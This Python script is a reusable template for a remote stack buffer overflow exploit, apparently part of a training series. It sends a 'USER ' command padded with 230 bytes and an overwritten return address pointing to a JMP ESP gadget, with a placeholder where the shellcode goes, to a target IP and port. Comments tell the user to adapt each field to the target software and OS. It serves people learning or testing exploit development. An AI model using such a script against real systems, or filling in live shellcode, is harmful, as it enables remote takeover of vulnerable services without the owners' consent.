#!/usr/bin/python

#SKELETON SCRIPT FOR FUZZING SOFTWARES REMOTELY, USEFUL FOR OVERFLOWS OVER THE NETWORK
#VERIFY JMPESP
#Follow me on twitter @acc3ssp0int

import socket
import sys
import time


if len(sys.argv) < 3:
	print("Usage: python 05-jmpesp.py $TargetIP $Port")
	sys.exit(1)

host = str(sys.argv[1])
port = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

cmd = 'USER ' #Modify This as per software
junk = '\x41' * 230 #Modify This as per software
eip = '\x53\x93\x42\x7e' #Modify This as per target OS
shellcode = '\x43' * 50
end = '\r\n' #Modify This as per software

buffer = cmd + junk + eip + shellcode + end

print("Created by acc3ssp0int, follow my content on https://acc3ssp0int.com, Thanks!")
time.sleep(3)
print("Passing Buffer in 3 seconds...")
time.sleep(3)
s.connect((host,port))
s.recv(1024)
s.send(buffer)
s.recv(1024)
s.close()
print("Done! Check your debugger :)")
time.sleep(1)
print("Exiting...")
time.sleep(1)
